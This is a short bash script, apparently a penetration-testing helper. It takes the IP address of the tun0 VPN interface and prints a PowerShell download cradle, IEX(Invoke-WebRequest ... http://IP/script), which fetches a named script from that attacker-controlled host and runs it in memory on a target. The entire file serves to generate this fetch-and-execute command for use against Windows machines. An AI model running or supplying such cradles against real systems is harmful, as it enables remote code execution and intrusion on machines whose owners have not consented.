#!/bin/bash

if [ "$#" -lt 1 ]; then
    printf '%s <downloadscript>' "$0" 1>&2
    exit 1
fi

ip="$(ip a s tun0 | grep -oP '(\d{1,3}\.){3}\d{1,3}')"
printf 'IEX(Invoke-WebRequest -UseBasicParsing http://%s/%s)' "$ip" "$1"
